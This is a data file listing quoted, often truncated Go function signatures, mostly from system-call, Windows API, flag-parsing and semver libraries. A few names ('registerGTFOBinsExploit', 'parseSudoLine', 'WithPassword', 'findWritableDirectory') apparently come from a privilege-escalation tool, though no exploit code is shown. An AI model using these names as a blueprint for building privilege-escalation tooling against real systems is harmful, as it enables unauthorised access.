"func VirtualFree(address uintptr, size uintptr, freetype uint32) (err error) {"
"func VirtualLock(addr uintptr, length uintptr) (err error) {"
"func VirtualProtect(address uintptr, size uintptr, newprotect uint32, oldprotect "
"func VirtualProtectEx(process Handle, address uintptr, size uintptr, newProtect uint32, oldProtect "
"func VirtualQuery(address uintptr, buffer "
"func VirtualQueryEx(process Handle, address uintptr, buffer "
"func VirtualUnlock(addr uintptr, length uintptr) (err error) {"
"func Vmsplice(fd int, iovs []Iovec, flags int) (int, error) {"
"func WSAGetOverlappedResult(h Handle, o "
"func WSAIoctl(s Handle, iocc uint32, inbuf "
"func WSARecv(s Handle, bufs "
"func WSARecvFrom(s Handle, bufs "
"func WSARecvMsg(fd Handle, msg "
"func WSASend(s Handle, bufs "
"func WSASendMsg(fd Handle, msg "
"func WSASendTo(s Handle, bufs "
"func WSASendto(s Handle, bufs "
"func WSASocket(af int32, typ int32, protocol int32, protoInfo "
"func WSAStartup(verreq uint32, data "
"func WTSEnumerateSessions(handle Handle, reserved uint32, version uint32, sessions "
"func WTSQueryUserToken(session uint32, token "
"func Wait4(pid int, wstatus "
"func WaitForMultipleObjects(handles []Handle, waitAll bool, waitMilliseconds uint32) (event uint32, err error) {"
"func WaitForSingleObject(handle Handle, waitMilliseconds uint32) (event uint32, err error) {"
"func Waitid(idType int, id int, info "
"func WinVerifyTrustEx(hwnd HWND, actionId "
"func WithPassword(username, password string, log logger.Logger) error {"
"func Write(fd Handle, p []byte) (n int, err error) {"
"func Write(fd int, p []byte) (n int, err error) {"
"func WriteConsole(console Handle, buf "
"func WriteFile(fd Handle, p []byte, done "
"func WriteProcessMemory(process Handle, baseAddress uintptr, buffer "
"func WriteStringAndCheck(b io.StringWriter, s string) {"
"func Writev(fd int, iovs [][]byte) (n int, err error) {"
"func Wstat(path string, edir []byte) (err error) {"
"func _GetProcAddress(module Handle, procname "
"func _IO(group byte, ioctl_num uintptr) uintptr {"
"func _IOC(inout uintptr, group byte, ioctl_num uintptr, param_len uintptr) uintptr {"
"func _IOR(group byte, ioctl_num uintptr, param_len uintptr) uintptr {"
"func _IOW(group byte, ioctl_num uintptr, param_len uintptr) uintptr {"
"func _IOWR(group byte, ioctl_num uintptr, param_len uintptr) uintptr {"
"func _VerQueryValue(block unsafe.Pointer, subBlock "
"func __major(version int, dev uint64) (val uint) {"
"func __makedev(version int, major uint, minor uint) (val uint64) {"
"func __minor(version int, dev uint64) (val uint) {"
"func accept(s int, rsa "
"func accept4(fd int, rsa "
"func accept4(s int, rsa "
"func anyToSockaddr(_ int, rsa "
"func anyToSockaddr(fd int, rsa "
"func anyToSockaddrGOOS(fd int, rsa "
"func appendIfNotPresent(s, stringToAppend string) string {"
"func argsMinusFirstX(args []string, x string) []string {"
"func armSyncFileRange(fd int, flags int, off int64, n int64) (err error) {"
"func await(s []byte) (n int, err error) {"
"func bind(name string, old string, flag int) (err error) {"
"func bind(s Handle, name unsafe.Pointer, namelen int32) (err error) {"
"func bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) {"
"func bind(s int, addr unsafe.Pointer, addrlen _Socklen) error {"
"func boolConv(sval string) (interface{}, error) {"
"func boolSliceConv(val string) (interface{}, error) {"
"func bytesBase64ValueConv(sval string) (interface{}, error) {"
"func bytesHexConv(sval string) (interface{}, error) {"
"func bytesToKey(b []byte, pasteActive bool) (rune, []byte) {"
"func callaccept(s int, rsa uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func callacct(_p0 uintptr) (r1 uintptr, e1 Errno) {"
"func callbind(s int, addr uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func callchdir(_p0 uintptr) (r1 uintptr, e1 Errno) {"
"func callchroot(_p0 uintptr) (r1 uintptr, e1 Errno) {"
"func callclose(fd int) (r1 uintptr, e1 Errno) {"
"func callconnect(s int, addr uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func calldup(oldfd int) (r1 uintptr, e1 Errno) {"
"func calldup2(oldfd int, newfd int) (r1 uintptr, e1 Errno) {"
"func callexit(code int) (r1 uintptr, e1 Errno) {"
"func callfaccessat(dirfd int, _p0 uintptr, mode uint32, flags int) (r1 uintptr, e1 Errno) {"
"func callfchdir(fd int) (r1 uintptr, e1 Errno) {"
"func callfchmod(fd int, mode uint32) (r1 uintptr, e1 Errno) {"
"func callfchmodat(dirfd int, _p0 uintptr, mode uint32, flags int) (r1 uintptr, e1 Errno) {"
"func callfchown(fd int, uid int, gid int) (r1 uintptr, e1 Errno) {"
"func callfchownat(dirfd int, _p0 uintptr, uid int, gid int, flags int) (r1 uintptr, e1 Errno) {"
"func callfcntl(fd uintptr, cmd int, arg uintptr) (r1 uintptr, e1 Errno) {"
"func callfdatasync(fd int) (r1 uintptr, e1 Errno) {"
"func callfstat(fd int, stat uintptr) (r1 uintptr, e1 Errno) {"
"func callfstatat(dirfd int, _p0 uintptr, stat uintptr, flags int) (r1 uintptr, e1 Errno) {"
"func callfstatfs(fd int, buf uintptr) (r1 uintptr, e1 Errno) {"
"func callfsync_range(fd int, how int, start int64, length int64) (r1 uintptr, e1 Errno) {"
"func callftruncate(fd int, length int64) (r1 uintptr, e1 Errno) {"
"func callgetcwd(_p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callgetdirent(fd int, _p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callgetegid() (r1 uintptr, e1 Errno) {"
"func callgeteuid() (r1 uintptr, e1 Errno) {"
"func callgetgid() (r1 uintptr, e1 Errno) {"
"func callgetgroups(n int, list uintptr) (r1 uintptr, e1 Errno) {"
"func callgetpeername(fd int, rsa uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func callgetpgid(pid int) (r1 uintptr, e1 Errno) {"
"func callgetpgrp() (r1 uintptr, e1 Errno) {"
"func callgetpid() (r1 uintptr, e1 Errno) {"
"func callgetppid() (r1 uintptr, e1 Errno) {"
"func callgetpriority(which int, who int) (r1 uintptr, e1 Errno) {"
"func callgetrlimit(resource int, rlim uintptr) (r1 uintptr, e1 Errno) {"
"func callgetrusage(who int, rusage uintptr) (r1 uintptr, e1 Errno) {"
"func callgetsid(pid int) (r1 uintptr, e1 Errno) {"
"func callgetsockname(fd int, rsa uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func callgetsockopt(s int, level int, name int, val uintptr, vallen uintptr) (r1 uintptr, e1 Errno) {"
"func callgetsystemcfg(label int) (r1 uintptr, e1 Errno) {"
"func callgettimeofday(tv uintptr, tzp uintptr) (r1 uintptr, e1 Errno) {"
"func callgetuid() (r1 uintptr, e1 Errno) {"
"func callioctl(fd int, req int, arg uintptr) (r1 uintptr, e1 Errno) {"
"func callkill(pid int, sig int) (r1 uintptr, e1 Errno) {"
"func calllchown(_p0 uintptr, uid int, gid int) (r1 uintptr, e1 Errno) {"
"func calllisten(s int, n int) (r1 uintptr, e1 Errno) {"
"func calllseek(fd int, offset int64, whence int) (r1 uintptr, e1 Errno) {"
"func calllstat(_p0 uintptr, stat uintptr) (r1 uintptr, e1 Errno) {"
"func callmadvise(_p0 uintptr, _lenp0 int, advice int) (r1 uintptr, e1 Errno) {"
"func callmkdir(dirfd int, _p0 uintptr, mode uint32) (r1 uintptr, e1 Errno) {"
"func callmkdirat(dirfd int, _p0 uintptr, mode uint32) (r1 uintptr, e1 Errno) {"
"func callmkfifo(_p0 uintptr, mode uint32) (r1 uintptr, e1 Errno) {"
"func callmknod(_p0 uintptr, mode uint32, dev int) (r1 uintptr, e1 Errno) {"
"func callmknodat(dirfd int, _p0 uintptr, mode uint32, dev int) (r1 uintptr, e1 Errno) {"
"func callmlock(_p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callmlockall(flags int) (r1 uintptr, e1 Errno) {"
"func callmmap64(addr uintptr, length uintptr, prot int, flags int, fd int, offset int64) (r1 uintptr, e1 Errno) {"
"func callmprotect(_p0 uintptr, _lenp0 int, prot int) (r1 uintptr, e1 Errno) {"
"func callmsync(_p0 uintptr, _lenp0 int, flags int) (r1 uintptr, e1 Errno) {"
"func callmunlock(_p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callmunlockall() (r1 uintptr, e1 Errno) {"
"func callmunmap(addr uintptr, length uintptr) (r1 uintptr, e1 Errno) {"
"func callnanosleep(time uintptr, leftover uintptr) (r1 uintptr, e1 Errno) {"
"func callnrecvmsg(s int, msg uintptr, flags int) (r1 uintptr, e1 Errno) {"
"func callnsendmsg(s int, msg uintptr, flags int) (r1 uintptr, e1 Errno) {"
"func callopen64(_p0 uintptr, mode int, perm uint32) (r1 uintptr, e1 Errno) {"
"func callopenat(dirfd int, _p0 uintptr, flags int, mode uint32) (r1 uintptr, e1 Errno) {"
"func callpause() (r1 uintptr, e1 Errno) {"
"func callpipe(p uintptr) (r1 uintptr, e1 Errno) {"
"func callpoll(fds uintptr, nfds int, timeout int) (r1 uintptr, e1 Errno) {"
"func callposix_fadvise64(fd int, offset int64, length int64, advice int) (r1 uintptr, e1 Errno) {"
"func callpread64(fd int, _p0 uintptr, _lenp0 int, offset int64) (r1 uintptr, e1 Errno) {"
"func callpselect(nfd int, r uintptr, w uintptr, e uintptr, timeout uintptr, sigmask uintptr) (r1 uintptr, e1 Errno) {"
"func callpwrite64(fd int, _p0 uintptr, _lenp0 int, offset int64) (r1 uintptr, e1 Errno) {"
"func callread(fd int, _p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callreadlink(_p0 uintptr, _p1 uintptr, _lenp1 int) (r1 uintptr, e1 Errno) {"
"func callrecvfrom(fd int, _p0 uintptr, _lenp0 int, flags int, from uintptr, fromlen uintptr) (r1 uintptr, e1 Errno) {"
"func callrenameat(olddirfd int, _p0 uintptr, newdirfd int, _p1 uintptr) (r1 uintptr, e1 Errno) {"
"func callselect(nfd int, r uintptr, w uintptr, e uintptr, timeout uintptr) (r1 uintptr, e1 Errno) {"
"func callsendto(s int, _p0 uintptr, _lenp0 int, flags int, to uintptr, addrlen uintptr) (r1 uintptr, e1 Errno) {"
"func callsetdomainname(_p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callsetgid(uid int) (r1 uintptr, e1 Errno) {"
"func callsetgroups(n int, list uintptr) (r1 uintptr, e1 Errno) {"
"func callsethostname(_p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func callsetpgid(pid int, pgid int) (r1 uintptr, e1 Errno) {"
"func callsetpriority(which int, who int, prio int) (r1 uintptr, e1 Errno) {"
"func callsetregid(rgid int, egid int) (r1 uintptr, e1 Errno) {"
"func callsetreuid(ruid int, euid int) (r1 uintptr, e1 Errno) {"
"func callsetrlimit(resource int, rlim uintptr) (r1 uintptr, e1 Errno) {"
"func callsetsid() (r1 uintptr, e1 Errno) {"
"func callsetsockopt(s int, level int, name int, val uintptr, vallen uintptr) (r1 uintptr, e1 Errno) {"
"func callsettimeofday(tv uintptr) (r1 uintptr, e1 Errno) {"
"func callsetuid(uid int) (r1 uintptr, e1 Errno) {"
"func callshutdown(fd int, how int) (r1 uintptr, e1 Errno) {"
"func callsocket(domain int, typ int, proto int) (r1 uintptr, e1 Errno) {"
"func callsocketpair(domain int, typ int, proto int, fd uintptr) (r1 uintptr, e1 Errno) {"
"func callsplice(rfd int, roff uintptr, wfd int, woff uintptr, len int, flags int) (r1 uintptr, e1 Errno) {"
"func callstat(_p0 uintptr, statptr uintptr) (r1 uintptr, e1 Errno) {"
"func callstatfs(_p0 uintptr, buf uintptr) (r1 uintptr, e1 Errno) {"
"func callstatx(dirfd int, _p0 uintptr, flags int, mask int, stat uintptr) (r1 uintptr, e1 Errno) {"
"func callsync() (r1 uintptr, e1 Errno) {"
"func callsyslog(typ int, _p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func calltime(t uintptr) (r1 uintptr, e1 Errno) {"
"func calltimes(tms uintptr) (r1 uintptr, e1 Errno) {"
"func calltruncate(_p0 uintptr, length int64) (r1 uintptr, e1 Errno) {"
"func callumask(mask int) (r1 uintptr, e1 Errno) {"
"func callumount(_p0 uintptr) (r1 uintptr, e1 Errno) {"
"func calluname(buf uintptr) (r1 uintptr, e1 Errno) {"
"func callunlink(_p0 uintptr) (r1 uintptr, e1 Errno) {"
"func callunlinkat(dirfd int, _p0 uintptr, flags int) (r1 uintptr, e1 Errno) {"
"func callustat(dev int, ubuf uintptr) (r1 uintptr, e1 Errno) {"
"func callutime(_p0 uintptr, buf uintptr) (r1 uintptr, e1 Errno) {"
"func callutimensat(dirfd int, _p0 uintptr, times uintptr, flag int) (r1 uintptr, e1 Errno) {"
"func callutimes(_p0 uintptr, times uintptr) (r1 uintptr, e1 Errno) {"
"func callwait4(pid int, status uintptr, options int, rusage uintptr) (r1 uintptr, e1 Errno) {"
"func callwrite(fd int, _p0 uintptr, _lenp0 int) (r1 uintptr, e1 Errno) {"
"func capRightsGet(version int, fd int, rightsp "
"func capRightsLimit(fd int, rightsp "
"func capright(idx uint64, bit uint64) uint64 {"
"func checkTokenMembership(tokenHandle Token, sidToCheck "
"func cm_MapCrToWin32Err(configRet CONFIGRET, defaultWin32Error Errno) (ret Errno) {"
"func comparePart(preSelf string, preOther string) int {"
"func comparePrereleases(v string, other string) int {"
"func connect(s Handle, name unsafe.Pointer, namelen int32) (err error) {"
"func connect(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) {"
"func connect(s int, addr unsafe.Pointer, addrlen _Socklen) error {"
"func connectEx(s Handle, name unsafe.Pointer, namelen int32, sendBuf "
"func constraintEqual(v, c "
"func constraintGreaterThan(v, c "
"func constraintGreaterThanEqual(v, c "
"func constraintLessThan(v, c "
"func constraintLessThanEqual(v, c "
"func constraintNotEqual(v, c "
"func constraintPessimistic(v, c "
"func convertFromDirents11(buf []byte, old []byte) int {"
"func convertStringSecurityDescriptorToSecurityDescriptor(str string, revision uint32, sd "
"func countConv(sval string) (interface{}, error) {"
"func create(path string, mode int, perm uint32) (fd int, err error) {"
"func createFileObj(name string, stat os.FileInfo) ("
"func createWellKnownSid(sidType WELL_KNOWN_SID_TYPE, domainSid "
"func direntIno(buf []byte) (uint64, bool) {"
"func direntNamlen(buf []byte) (uint64, bool) {"
"func direntReclen(buf []byte) (uint64, bool) {"
"func durationConv(sval string) (interface{}, error) {"
"func durationSliceConv(val string) (interface{}, error) {"
"func encodeHex(dst []byte, uuid UUID) {"
"func extpread(fd int, p []byte, flags int, offset int64) (n int, err error) {"
"func extpwrite(fd int, p []byte, flags int, offset int64) (n int, err error) {"
"func faccessat(dirfd int, path string, mode uint32) (err error) {"
"func fail(format string, args ...interface{}) {"
"func fanotifyMark(fd int, flags uint, mask uint64, dirFd int, pathname "
"func fchmodat(dirfd int, path string, mode uint32) (err error) {"
"func fcntl(fd int, cmd int, arg int) (val int, err error) {"
"func fcntl(fd int, cmd, arg int) (int, error) {"
"func fd2path(fd int, buf []byte) (err error) {"
"func fdopendir(fd int) (dir uintptr, err error) {"
"func fgetxattr(fd int, attr string, dest "
"func findNextFile1(handle Handle, data "
"func findResource(module Handle, name uintptr, resType uintptr) (resInfo Handle, err error) {"
"func findWritableDirectory() (string, error) {"
"func flistxattr(fd int, dest "
"func float32Conv(sval string) (interface{}, error) {"
"func float32SliceConv(val string) (interface{}, error) {"
"func float64Conv(sval string) (interface{}, error) {"
"func float64SliceConv(val string) (interface{}, error) {"
"func fremovexattr(fd int, attr string, options int) (err error) {"
"func fsetxattr(fd int, attr string, data "
"func fstat(fd int, st "
"func fstat(fd int, stat "
"func fstat_freebsd12(fd int, stat "
"func fstatat(dirfd int, path string, st "
"func fstatat(dirfd int, path string, stat "
"func fstatat(fd int, path string, stat "
"func fstatat_freebsd12(fd int, path string, stat "
"func fstatfs(fd int, stat "
"func fstatfs_freebsd12(fd int, stat "
"func fsyncRange(fd int, how int, start int64, length int64) (err error) {"
"func futimes(fd int, timeval "
"func futimesat(dirfd int, path string, times "
"func futimesat(dirfd int, path string, tv "
"func futimesat(fildes int, path "
"func gbit16(b []byte) (uint16, []byte) {"
"func gbit32(b []byte) (uint32, []byte) {"
"func gbit64(b []byte) (uint64, []byte) {"
"func gbit8(b []byte) (uint8, []byte) {"
"func gen(buf io.StringWriter, cmd "
"func genBashComp(buf io.StringWriter, name string, includeDesc bool) {"
"func genFishComp(buf io.StringWriter, name string, includeDesc bool) {"
"func genPowerShellComp(buf io.StringWriter, name string, includeDesc bool) {"
"func genZshComp(buf io.StringWriter, name string, includeDesc bool) {"
"func getHardwareInterface(name string) (string, []byte) { return """", nil }"
"func getHardwareInterface(name string) (string, []byte) {"
"func getNamedSecurityInfo(objectName string, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"func getProcessPreferredUILanguages(flags uint32, numLanguages "
"func getRegistryValue(buf []byte, dataType uint32) (interface{}, error) {"
"func getSecurityInfo(handle Handle, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"func getSize(fd int) (width, height int, err error) {"
"func getSystemPreferredUILanguages(flags uint32, numLanguages "
"func getThreadPreferredUILanguages(flags uint32, numLanguages "
"func getTime() (Time, uint16, error) {"
"func getUILanguages(flags uint32, f func(flags uint32, numLanguages "
"func getUserPreferredUILanguages(flags uint32, numLanguages "
"func getdirent(fd int, buf []byte) (n int, err error) {"
"func getdirentries(fd int, buf []byte, basep "
"func getdirentries_freebsd12(fd int, buf []byte, basep "
"func getfsstat(buf unsafe.Pointer, size uintptr, flags int) (n int, err error) {"
"func getgroups(n int, list "
"func getgroups(ngid int, gid "
"func gethostname(buf []byte) (n int, err error) {"
"func getitimer(which int, currValue "
"func getmsg(fd int, clptr "
"func getpeername(fd int, rsa "
"func getpeername(s Handle, rsa "
"func getpeername(s int, rsa "
"func getppid() (pid int, err error) {"
"func getrlimit(resource int, rlim "
"func getrusage(who int, rusage "
"func getsockname(fd int, rsa "
"func getsockname(s Handle, rsa "
"func getsockname(s int, rsa "
"func getsockopt(s int, level int, name int, val unsafe.Pointer, vallen "
"func getxattr(path string, attr string, dest "
"func gstring(b []byte) (string, []byte, bool) {"
"func hasNoOptDefVal(name string, fs "
"func initxattrdest(dest []byte, idx int) (d unsafe.Pointer) {"
"func int16Conv(sval string) (interface{}, error) {"
"func int32Conv(sval string) (interface{}, error) {"
"func int32SliceConv(val string) (interface{}, error) {"
"func int64Conv(sval string) (interface{}, error) {"
"func int64SliceConv(val string) (interface{}, error) {"
"func int8Conv(sval string) (interface{}, error) {"
"func intConv(sval string) (interface{}, error) {"
"func intSliceConv(val string) (interface{}, error) {"
"func ioctl(fd int, req uint, arg uintptr) (err error) {"
"func ioctl(fd, cmd, ptr uintptr) error {"
"func ioctlIfreqData(fd int, req uint, value "
"func ioctlPtr(fd int, req uint, arg unsafe.Pointer) (err error) {"
"func ioctlRet(fd int, req uint, arg uintptr) (ret int, err error) {"
"func ipConv(sval string) (interface{}, error) {"
"func ipNetConv(sval string) (interface{}, error) {"
"func ipSliceConv(val string) (interface{}, error) {"
"func isTokenRestricted(tokenHandle Token) (ret bool, err error) {"
"func isptmaster(fd uintptr) (bool, error) {"
"func kevent(kq int, change unsafe.Pointer, nchange int, event unsafe.Pointer, nevent int, timeout "
"func kexecFileLoad(kernelFd int, initrdFd int, cmdlineLen int, cmdline string, flags int) (err error) {"
"func keyctlDH(cmd int, arg2 "
"func keyctlIOV(cmd int, arg2 int, payload []Iovec, arg5 int) (err error) {"
"func keyctlJoin(cmd int, arg2 string) (ret int, err error) {"
"func keyctlRestrictKeyring(cmd int, arg2 int) (err error) {"
"func keyctlRestrictKeyringByType(cmd int, arg2 int, keyType string, restriction string) (err error) {"
"func keyctlSearch(cmd int, arg2 int, arg3 string, arg4 string, arg5 int) (ret int, err error) {"
"func kill(pid int, signum int, posix int) (err error) {"
"func langID(pri, sub uint16) uint32 { return uint32(sub)<<10 "
"func ld(s, t string, ignoreCase bool) int {"
"func listen(s Handle, backlog int32) (err error) {"
"func listxattr(path string, dest "
"func loadLibraryEx(name string, system bool) ("
"func lstat(path string, st "
"func lstat(path string, stat "
"func majmin() (major int, minor int, err error) {"
"func mknod(path string, mode uint32, dev int) (err error) {"
"func mknodat(fd int, path string, mode uint32, dev int) (err error) {"
"func mknodat_freebsd12(fd int, path string, mode uint32, dev uint64) (err error) {"
"func mmap(addr uintptr, length uintptr, prot int, flag int, fd int, pos int64) (ret uintptr, err error) {"
"func mmap(addr uintptr, length uintptr, prot int, flags int, fd int, offset int64) (xaddr uintptr, err error) {"
"func mmap2(addr uintptr, length uintptr, prot int, flags int, fd int, pageOffset uintptr) (xaddr uintptr, err error) {"
"func mount(fd int, afd int, old string, flag int, aname string) (err error) {"
"func mount(source string, target string, fstype string, flags uintptr, data "
"func mountSetattr(dirfd int, pathname string, flags uint, attr "
"func mount_LE(path string, filesystem string, fstype string, mtm uint32, parmlen int32, parm string) (err error) {"
"func munmap(addr uintptr, length uintptr) (err error) {"
"func nameToHandleAt(dirFD int, pathname string, fh "
"func nametomib(name string) (mib []_C_int, err error) {"
"func newBoolSliceValue(val []bool, p "
"func newBoolValue(val bool, p "
"func newBytesBase64Value(val []byte, p "
"func newBytesHexValue(val []byte, p "
"func newCountValue(val int, p "
"func newDurationSliceValue(val []time.Duration, p "
"func newDurationValue(val time.Duration, p "
"func newFloat32SliceValue(val []float32, p "
"func newFloat32Value(val float32, p "
"func newFloat64SliceValue(val []float64, p "
"func newFloat64Value(val float64, p "
"func newIPMaskValue(val net.IPMask, p "
"func newIPNetValue(val net.IPNet, p "
"func newIPSliceValue(val []net.IP, p "
"func newIPValue(val net.IP, p "
"func newInt16Value(val int16, p "
"func newInt32SliceValue(val []int32, p "
"func newInt32Value(val int32, p "
"func newInt64SliceValue(val []int64, p "
"func newInt64Value(val int64, p "
"func newInt8Value(val int8, p "
"func newIntSliceValue(val []int, p "
"func newIntValue(val int, p "
"func newRandomFromPool() (UUID, error) {"
"func newStringArrayValue(val []string, p "
"func newStringSliceValue(val []string, p "
"func newStringToInt64Value(val map[string]int64, p "
"func newStringToIntValue(val map[string]int, p "
"func newStringToStringValue(val map[string]string, p "
"func newStringValue(val string, p "
"func newUint16Value(val uint16, p "
"func newUint32Value(val uint32, p "
"func newUint64Value(val uint64, p "
"func newUint8Value(val uint8, p "
"func newUintSliceValue(val []uint, p "
"func newUintValue(val uint, p "
"func newVersion(v string, pattern "
"func offs2lohi(offs int64) (lo, hi uintptr) {"
"func open() (pty, tty "
"func open(path string, mode int) (fd int, err error) {"
"func open(path string, mode int, perm uint32) (fd int, err error) {"
"func openByHandleAt(mountFD int, fh "
"func openat(dirfd int, path string, flags int, mode uint32) (fd int, err error) {"
"func openat2(dirfd int, path string, open_how "
"func parseIPv4Mask(sval string) (interface{}, error) {"
"func parseSudoLine(line string, hostname string) ("
"func pbit16(b []byte, v uint16) []byte {"
"func pbit32(b []byte, v uint32) []byte {"
"func pbit64(b []byte, v uint64) []byte {"
"func pbit8(b []byte, v uint8) []byte {"
"func pipe() (r int, w int, err error) {"
"func pledgeAvailable(maj, min int, execpromises string) error {"
"func port_associate(port int, source int, object uintptr, events int, user "
"func port_create() (n int, err error) {"
"func port_dissociate(port int, source int, object uintptr) (n int, err error) {"
"func port_get(port int, pe "
"func port_getn(port int, pe "
"func posixOpenpt(oflag int) (fd int, err error) {"
"func pread(fd int, p []byte, offset int64) (n int, err error) {"
"func preadv(fd int, iovs []Iovec, off int64) (n int, err error) {"
"func preadv(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr) (n int, err error) {"
"func preadv2(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr, flags int) (n int, err error) {"
"func prereleaseCheck(v, c "
"func pstring(b []byte, s string) []byte {"
"func ptrace(request int, pid int, addr uintptr, data int) (err error) {"
"func ptrace(request int, pid int, addr uintptr, data uintptr) (err error) {"
"func ptrace(request int, pid int, addr uintptr, data uintptr) error {"
"func ptrace1(request int, pid int, addr uintptr, data uintptr) (err error) {"
"func ptracePeek(req int, pid int, addr uintptr, out []byte) (count int, err error) {"
"func ptracePoke(pokeReq int, peekReq int, pid int, addr uintptr, data []byte) (count int, err error) {"
"func ptsdev(fd uintptr) (uint64, error) {"
"func putmsg(fd int, clptr "
"func pwrite(fd int, p []byte, offset int64) (n int, err error) {"
"func pwritev(fd int, iovs []Iovec, off int64) (n int, err error) {"
"func pwritev(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr) (n int, err error) {"
"func pwritev2(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr, flags int) (n int, err error) {"
"func raceReadRange(addr unsafe.Pointer, len int) {"
"func raceWriteRange(addr unsafe.Pointer, len int) {"
"func rawSyscall6(trap, nargs, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func rawSysvicall6(trap, nargs, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func rawsocketcall(call int, a0, a1, a2, a3, a4, a5 uintptr) (int, syscall.Errno) {"
"func rawsocketcall(call int, a0, a1, a2, a3, a4, a5 uintptr) (n int, err syscall.Errno)"
"func read(fd int, p []byte) (n int, err error) {"
"func readAsCSV(val string) ([]string, error) {"
"func readFile(handle Handle, buf []byte, done "
"func readInt(b []byte, off, size uintptr) (u uint64, ok bool) {"
"func readIntBE(b []byte, size uintptr) uint64 {"
"func readIntLE(b []byte, size uintptr) uint64 {"
"func readPassword(fd int) ([]byte, error) {"
"func readPasswordLine(reader io.Reader) ([]byte, error) {"
"func readdir_r(dir uintptr, entry "
"func readlen(fd int, buf "
"func readlen(fd int, p "
"func readnum(path string) (uint, error) {"
"func readv(fd int, iovs []Iovec) (n int, err error) {"
"func readvRacedetect(iovecs []Iovec, n int, err error) {"
"func realSyscall(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r, errno uintptr)"
"func realSyscallNoError(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r uintptr)"
"func reboot(magic1 uint, magic2 uint, cmd int, arg string) (err error) {"
"func recvfrom(fd int, p []byte, flags int, from "
"func recvfrom(s Handle, buf []byte, flags int32, from "
"func recvfrom(s int, p []byte, flags int, from "
"func recvmsg(s int, msg "
"func recvmsgRaw(fd int, p, oob []byte, flags int, rsa "
"func register(name string, speed Speed, vulnerability Vulnerability) {"
"func registerGTFOBinsExploit(binaryName string, args []string, inputs []string, envs []string, tmpFileContent string) {"
"func removexattr(path string, attr string, options int) (err error) {"
"func restore(fd int, state "
"func rightToIndex(right uint64) (int, error) {"
"func roundup(x, y int) int {"
"func rpad(s string, padding int) string {"
"func schedAffinity(trap uintptr, pid int, set "
"func seek(fd int, offset int64, whence int) (int64, syscall.Errno) {"
"func seek(fd int, offset int64, whence int) (newoffset int64, err syscall.Errno)"
"func seek(placeholder uintptr, fd int, offset int64, whence int) (newoffset int64, err string)"
"func sendfile(infd int, outfd int, offset int64, len "
"func sendfile(outfd int, infd int, offset "
"func sendmsg(s int, msg "
"func sendmsgN(fd int, p, oob []byte, ptr unsafe.Pointer, salen _Socklen, flags int) (n int, err error) {"
"func sendto(s Handle, buf []byte, flags int32, to unsafe.Pointer, tolen int32) (err error) {"
"func sendto(s int, buf []byte, flags int, to unsafe.Pointer, addrlen _Socklen) (err error) {"
"func sendto(s int, p []byte, flags int, to unsafe.Pointer, addrlen _Socklen) (err error) {"
"func sendto(s int, p []byte, flags int, to unsafe.Pointer, addrlen _Socklen) error {"
"func setConsoleCursorPosition(console Handle, position uint32) (err error) {"
"func setEntriesInAcl(countExplicitEntries uint32, explicitEntries "
"func setTimespec(sec, nsec int64) Timespec {"
"func setTimeval(sec, usec int64) Timeval { //fix"
"func setTimeval(sec, usec int64) Timeval {"
"func setfsgid(gid int) (prev int, err error) {"
"func setfsuid(uid int) (prev int, err error) {"
"func setgroups(n int, list "
"func setgroups(ngid int, gid "
"func setitimer(which int, newValue "
"func setrlimit(resource int, rlim "
"func setsockopt(s int, level int, name int, val unsafe.Pointer, vallen uintptr) (err error) {"
"func setsockopt(s int, level int, name int, val unsafe.Pointer, vallen uintptr) error {"
"func setupDiCreateDeviceInfo(deviceInfoSet DevInfo, DeviceName "
"func setupDiEnumDeviceInfo(deviceInfoSet DevInfo, memberIndex uint32, deviceInfoData "
"func setupDiEnumDriverInfo(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetDeviceInfoListDetail(deviceInfoSet DevInfo, deviceInfoSetDetailData "
"func setupDiGetDeviceInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetDeviceInstanceId(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetDeviceProperty(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetDriverInfoDetail(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetSelectedDevice(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiGetSelectedDriver(deviceInfoSet DevInfo, deviceInfoData "
"func setupDiSetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"func setxattr(path string, attr string, data "
"func shmat(id int, addr uintptr, flag int) (ret uintptr, err error) {"
"func shmctl(id int, cmd int, buf "
"func shmget(key int, size int, flag int) (id int, err error) {"
"func shortHasNoOptDefVal(name string, fs "
"func shutdown(s Handle, how int32) (err error) {"
"func signalfd(fd int, sigmask "
"func socket(af int32, typ int32, protocol int32) (handle Handle, err error) {"
"func socket(domain int, typ int, proto int) (fd int, err error) {"
"func socket(domain int, typ int, proto int) (int, error) {"
"func socketcall(call int, a0, a1, a2, a3, a4, a5 uintptr) (int, syscall.Errno) {"
